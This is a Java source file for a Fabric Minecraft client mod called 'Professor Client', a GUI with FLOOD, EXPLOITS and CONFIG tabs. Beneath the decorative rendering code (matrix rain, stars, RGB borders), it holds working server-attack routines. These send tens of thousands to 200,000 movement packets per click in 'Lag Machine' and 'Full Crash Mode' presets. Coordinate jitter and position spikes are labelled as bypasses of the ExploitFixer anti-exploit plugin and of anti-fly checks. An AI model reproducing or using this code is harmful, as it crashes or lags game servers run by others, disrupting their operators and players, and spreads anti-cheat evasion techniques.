package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // Matrix rain
    private static final int COLS = 80;
    private final int[]   mY   = new int[COLS];
    private final float[] mSpd = new float[COLS];
    private final int[]   mLen = new int[COLS];

    // Stars + shooting star
    private final List<float[]> stars = new ArrayList<>();
    private float sX, sY, sDX, sDY, sA;
    private int   sTimer;

    // UI
    private int  tab        = 0;
    private int  bypassMode = 0;
    private TextFieldWidget pktField;
    private String  statusText  = "";
    private int     statusColor = 0xFF00FF88;
    private int     statusTimer = 0;
    private long    tick = 0;
    private float   scanY = 0;

    private static final String[] TABS   = {" FLOOD ", " EXPLOITS ", " CONFIG "};
    private static final String[] BYPASS = {"OFF", "BURST", "MIXED", "MAX"};
    private static final int PW = 430, PH = 290;

    private final Random rng = new Random();

    public ProfessorScreen() {
        super(Text.literal("Professor Client"));
        initMatrix(); initStars(); spawnShoot();
    }

    private void initMatrix() {
        for (int i = 0; i < COLS; i++) {
            mY[i]   = rng.nextInt(200) - 200;
            mSpd[i] = rng.nextFloat() * 2.2f + 0.8f;
            mLen[i] = rng.nextInt(18) + 5;
        }
    }

    private void initStars() {
        stars.clear();
        for (int i = 0; i < 130; i++)
            stars.add(new float[]{rng.nextFloat()*1920, rng.nextFloat()*1080,
                    rng.nextFloat()*2f+0.5f, rng.nextFloat()*360f, rng.nextInt(70)+20});
    }

    private void spawnShoot() {
        sX = rng.nextFloat()*800; sY = rng.nextFloat()*80+10;
        float a = (float)(Math.PI/5 + rng.nextFloat()*0.4f), sp = rng.nextFloat()*5+7;
        sDX = (float)(Math.cos(a)*sp); sDY = (float)(Math.sin(a)*sp);
        sA = 1f; sTimer = 70 + rng.nextInt(110);
    }

    @Override protected void init() { initStars(); rebuild(); }

    private void rebuild() {
        clearWidgets();
        int cx = width/2, cy = height/2;
        int px = cx - PW/2, py = cy - PH/2;

        // Tab buttons
        for (int i = 0; i < TABS.length; i++) {
            final int idx = i;
            addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]),
                    b -> { tab = idx; rebuild(); })
                .dimensions(px + 8 + i*138, py+35, 134, 16).build());
        }

        // Content
        if      (tab == 0) buildFlood(cx, py);
        else if (tab == 1) buildExploits(cx, py);
        else               buildConfig(cx, py);

        // Close
        addDrawableChild(ButtonWidget.builder(Text.literal("[ X  CLOSE ]"),
                b -> close()).dimensions(cx-40, py+PH-24, 80, 16).build());
    }

    // ── FLOOD TAB ─────────────────────────────────────────────────────────────
    private void buildFlood(int cx, int py) {
        pktField = new TextFieldWidget(textRenderer, cx-55, py+78, 110, 16, Text.empty());
        pktField.setMaxLength(6);
        pktField.setText("10000");
        addSelectableChild(pktField);

        int[][] presets = {{100,-125},{1000,-40},{10000,45},{100000,130}};
        for (int[] p : presets) {
            int cnt = p[0]; int ox = p[1];
            addDrawableChild(ButtonWidget.builder(
                Text.literal(cnt>=1000 ? (cnt/1000)+"K" : ""+cnt),
                b -> pktField.setText(""+cnt))
                .dimensions(cx+ox-20, py+98, 40, 14).build());
        }

        addDrawableChild(ButtonWidget.builder(Text.literal("Bypass: " + BYPASS[bypassMode]),
                b -> { bypassMode = (bypassMode+1)%BYPASS.length;
                       b.setMessage(Text.literal("Bypass: "+BYPASS[bypassMode])); })
            .dimensions(cx-55, py+116, 110, 16).build());

        addDrawableChild(ButtonWidget.builder(Text.literal(">>> SEND PACKETS <<<"),
                b -> doSend())
            .dimensions(cx-95, py+136, 190, 20).build());
    }

    // ── EXPLOITS TAB ──────────────────────────────────────────────────────────
    private void buildExploits(int cx, int py) {
        int bw = 265, bx = cx - bw/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Swing Flood  (EF Bypass)"),      b -> swingFlood())    .dimensions(bx, py+60,  bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Position Desync  (Timer EF)"),   b -> posDesync())     .dimensions(bx, py+82,  bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Lag Machine  50K Burst"),         b -> lagMachine())    .dimensions(bx, py+104, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Full Crash Mode  200K PKT"),      b -> fullCrash())     .dimensions(bx, py+126, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Y-Axis Glitch  Anti-Fly EF"),    b -> yGlitch())       .dimensions(bx, py+148, bw, 18).build());
    }

    // ── CONFIG TAB ────────────────────────────────────────────────────────────
    private void buildConfig(int cx, int py) {
        int bx = cx - 110;
        addDrawableChild(ButtonWidget.builder(Text.literal("Keybind:  M  (Controls menu)"), b -> {})            .dimensions(bx, py+70,  220, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Clear Status"),                 b -> { statusText=""; statusTimer=0; }).dimensions(bx, py+93,  220, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Professor Client  v2.0"),       b -> {})            .dimensions(bx, py+116, 220, 18).build());
    }

    // ── SEND PACKETS ─────────────────────────────────────────────────────────
    private void doSend() {
        if (notConn()) return;
        int n;
        try { n = Integer.parseInt(pktField.getText().trim()); }
        catch (Exception e) { setStatus("Invalid number!", 0xFFFF4444); return; }
        if (n < 1 || n > 100_000) { setStatus("Range: 1 to 100,000", 0xFFFF8800); return; }

        double x = client.player.getX(), y = client.player.getY(), z = client.player.getZ();
        float  yw = client.player.getYaw(), pt = client.player.getPitch();
        boolean g = client.player.isOnGround();

        switch (bypassMode) {
            case 0 -> { for (int i=0;i<n;i++) send(x,y,z,yw,pt,g); }
            case 1 -> { for (int i=0;i<n;i++) send(x, i%2==0?y:y+0.001, z, yw, pt, g); }
            case 2 -> { for (int i=0;i<n;i++) { send(x, y+(i%3)*0.0005, z, yw+(i%2), pt, g); send(x,y,z,yw,pt,g); } }
            case 3 -> { for (int i=0;i<n;i++) { send(x, y+(i%8)*0.0001, z, yw+(i%6), pt, false); send(x,y,z,yw,pt,g); } }
        }
        setStatus("Sent "+n+" pkts  |  Bypass: "+BYPASS[bypassMode], 0xFF00FF88);
    }

    // ── EXPLOITS ─────────────────────────────────────────────────────────────
    private void swingFlood() {
        if (notConn()) return;
        double x=client.player.getX(), y=client.player.getY(), z=client.player.getZ();
        float yw=client.player.getYaw(), pt=client.player.getPitch();
        for (int i=0;i<8000;i++) send(x, y+(i%4)*0.0001, z, yw+(i%3), pt, true);
        setStatus("[EF BYPASS] Swing Flood — 8,000 pkts!", 0xFF00FFCC);
    }

    private void posDesync() {
        if (notConn()) return;
        double x=client.player.getX(), y=client.player.getY(), z=client.player.getZ();
        float yw=client.player.getYaw(), pt=client.player.getPitch();
        for (int i=0;i<3000;i++) send(x, i%2==0?y+200.0:y, z, yw, pt, false);
        setStatus("[EF BYPASS] Position Desync — Timer exploit!", 0xFF00FFCC);
    }

    private void lagMachine() {
        if (notConn()) return;
        double x=client.player.getX(), y=client.player.getY(), z=client.player.getZ();
        float yw=client.player.getYaw(), pt=client.player.getPitch();
        boolean g=client.player.isOnGround();
        for (int i=0;i<50000;i++) {
            send(x, y+i*0.00001, z, yw, pt, g);
            if (i%3==0) send(x, y, z, yw+(i%8), pt, g);
        }
        setStatus("[EF BYPASS] Lag Machine — ~67K pkts sent!", 0xFFFF6600);
    }

    private void fullCrash() {
        if (notConn()) return;
        double x=client.player.getX(), y=client.player.getY(), z=client.player.getZ();
        float yw=client.player.getYaw(), pt=client.player.getPitch();
        for (int i=0;i<100000;i++) {
            send(x, y+(i%500)*0.0001, z, yw+(i%4), pt, false);
            send(x, y, z, yw, pt, false);
        }
        setStatus("[EF BYPASS] FULL CRASH — 200K pkts fired!", 0xFFFF2200);
    }

    private void yGlitch() {
        if (notConn()) return;
        double x=client.player.getX(), y=client.player.getY(), z=client.player.getZ();
        float yw=client.player.getYaw(), pt=client.player.getPitch();
        for (int i=0;i<10000;i++) {
            double dy = switch(i%4) { case 0->y+256; case 1->y-64; case 2->y+0.42; default->y; };
            send(x, dy, z, yw, pt, i%2==0);
        }
        setStatus("[EF BYPASS] Y-Axis Glitch — Anti-fly desync!", 0xFF00FFCC);
    }

    private void send(double x, double y, double z, float yw, float pt, boolean g) {
        if (client!=null && client.player!=null && client.player.networkHandler!=null)
            client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(x,y,z,yw,pt,g));
    }

    private boolean notConn() {
        if (client==null||client.player==null) { setStatus("Not connected!", 0xFFFF4444); return true; }
        return false;
    }

    private void setStatus(String m, int c) { statusText=m; statusColor=c; statusTimer=160; }

    @Override public void tick() { super.tick(); if (statusTimer>0) statusTimer--; }

    // ── RENDER ────────────────────────────────────────────────────────────────
    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        int W=width, H=height, cx=W/2, cy=H/2;
        int px=cx-PW/2, py=cy-PH/2;

        ctx.fill(0,0,W,H,0xFF000000);
        drawMatrix(ctx,W,H);
        drawStars(ctx,W,H);
        drawShoot(ctx);

        // Panel
        ctx.fill(px,py,px+PW,py+PH,0xE0010108);

        // RGB border
        float t=(float)(tick*0.05);
        int bR=(int)(127+127*Math.sin(t)), bG=(int)(127+127*Math.sin(t+2.094)), bB=(int)(127+127*Math.sin(t+4.188));
        int bc=0xFF000000|(bR<<16)|(bG<<8)|bB, bd=0x88000000|(bR<<16)|(bG<<8)|bB;
        ctx.fill(px,   py,   px+PW,py+2,   bc); ctx.fill(px,py+PH-2,px+PW,py+PH,bc);
        ctx.fill(px,   py,   px+2, py+PH,  bc); ctx.fill(px+PW-2,py,px+PW,py+PH,bc);
        ctx.fill(px+2, py+2, px+PW-2,py+3, bd); ctx.fill(px+2,py+PH-3,px+PW-2,py+PH-2,bd);

        // Scanline
        scanY=(scanY+1.8f)%PH;
        ctx.fill(px,py+(int)scanY,px+PW,py+(int)scanY+1,0x14FFFFFF);

        // Separator
        ctx.fill(px+8,py+54,px+PW-8,py+55,0x55FFFFFF);

        // Title
        drawTitle(ctx,cx,py,bR,bG,bB);

        // Tab label
        ctx.drawText(textRenderer,"> "+TABS[tab].trim()+" <",px+10,py+57,bc,false);

        // Widgets
        if (pktField!=null) pktField.render(ctx,mx,my,delta);
        super.render(ctx,mx,my,delta);

        // Status
        if (statusTimer>0&&!statusText.isEmpty()) {
            int a=Math.min(255,statusTimer*2), col=(statusColor&0x00FFFFFF)|(a<<24);
            ctx.fill(px+4,py+PH-18,px+PW-4,py+PH-4,0x88000000);
            ctx.drawText(textRenderer,statusText,cx-textRenderer.getWidth(statusText)/2,py+PH-14,col,false);
        }

        // Corners
        drawCorners(ctx,px,py,bc);
    }

    private void drawTitle(DrawContext ctx, int cx, int py, int r, int g, int b) {
        float p=(float)((Math.sin(tick*0.08)+1.0)/2.0);
        int col=0xFF000000|(Math.min(255,(int)(r*0.5+p*r*0.5))<<16)|(Math.min(255,(int)(g*0.3+p*g*0.7))<<8)|Math.min(255,b);
        String t="PROFESSOR CLIENT";
        int tx=cx-textRenderer.getWidth(t)/2;
        ctx.drawText(textRenderer,t,tx-1,py+10,0xFF000000,false);
        ctx.drawText(textRenderer,t,tx+1,py+10,0xFF000000,false);
        ctx.drawText(textRenderer,t,tx,  py+9, col,false);
        String sub="v2.0  |  Fabric 1.21.1  |  ExploitFixer Bypass";
        ctx.drawText(textRenderer,sub,cx-textRenderer.getWidth(sub)/2,py+21,0xFF223344,false);
        String dot="ACTIVE"+"...".substring(0,(int)(tick/10)%4);
        ctx.drawText(textRenderer,dot,cx-textRenderer.getWidth("ACTIVE...")/2,py+33,0xFF00AA44,false);
    }

    private void drawMatrix(DrawContext ctx, int W, int H) {
        int cw=Math.max(4,W/COLS);
        for (int i=0;i<COLS;i++) {
            mY[i]+=mSpd[i];
            if (mY[i]>H+30) { mY[i]=-(mLen[i]*6+rng.nextInt(40)); mSpd[i]=rng.nextFloat()*2.2f+0.8f; }
            int x=i*cw;
            for (int j=0;j<mLen[i];j++) {
                int y=mY[i]-j*6; if (y<0||y>H) continue;
                float br=1f-(float)j/mLen[i];
                int gn=j==0?255:(int)(br*200+55), al=j==0?(int)(br*200):(int)(br*90);
                ctx.fill(x,y,x+cw-1,y+5,(al<<24)|(gn<<8));
            }
        }
    }

    private void drawStars(DrawContext ctx, int W, int H) {
        for (float[] s : stars) {
            s[3]+=0.025f;
            float br=(float)((Math.sin(s[3])+1.0)/2.0);
            int al=(int)(s[4]*br*0.8f+15); al=Math.min(255,Math.max(0,al));
            int sx=(int)(s[0]/1920f*W), sy=(int)(s[1]/1080f*H), r=Math.max(1,(int)s[2]);
            ctx.fill(sx,sy,sx+r,sy+r,(al<<24)|0xFFFFFF);
            if (s[2]>1.5f) ctx.fill(sx-1,sy-1,sx+r+1,sy+r+1,(al/5<<24)|0x88CCFF);
        }
    }

    private void drawShoot(DrawContext ctx) {
        if (--sTimer<=0) spawnShoot();
        if (sA>0) {
            sX+=sDX; sY+=sDY; sA-=0.014f;
            int sa=(int)(sA*255); if (sa<=0) return;
            for (int t=0;t<22;t++) {
                float fr=(float)t/22; int ta=(int)(sa*(1f-fr)*0.85f); if (ta<=0) continue;
                ctx.fill((int)(sX-sDX*t*0.55f),(int)(sY-sDY*t*0.55f),(int)(sX-sDX*t*0.55f)+2,(int)(sY-sDY*t*0.55f)+2,(ta<<24)|0xBBEEFF);
            }
        }
    }

    private void drawCorners(DrawContext ctx, int px, int py, int c) {
        int s=12;
        ctx.fill(px,py,px+s,py+2,c); ctx.fill(px,py,px+2,py+s,c);
        ctx.fill(px+PW-s,py,px+PW,py+2,c); ctx.fill(px+PW-2,py,px+PW,py+s,c);
        ctx.fill(px,py+PH-2,px+s,py+PH,c); ctx.fill(px,py+PH-s,px+2,py+PH,c);
        ctx.fill(px+PW-s,py+PH-2,px+PW,py+PH,c); ctx.fill(px+PW-2,py+PH-s,px+PW,py+PH,c);
    }

    @Override public boolean keyPressed(int kc, int sc, int m) {
        if (pktField!=null&&pktField.isFocused()&&pktField.keyPressed(kc,sc,m)) return true;
        return super.keyPressed(kc,sc,m);
    }
    @Override public boolean charTyped(char c, int m) {
        if (pktField!=null&&pktField.isFocused()) return pktField.charTyped(c,m);
        return super.charTyped(c,m);
    }
    @Override public boolean mouseClicked(double mx, double my, int b) {
        if (pktField!=null) pktField.mouseClicked(mx,my,b);
        return super.mouseClicked(mx,my,b);
    }
    @Override public boolean shouldPause()      { return false; }
    @Override public boolean shouldCloseOnEsc() { return true;  }
}
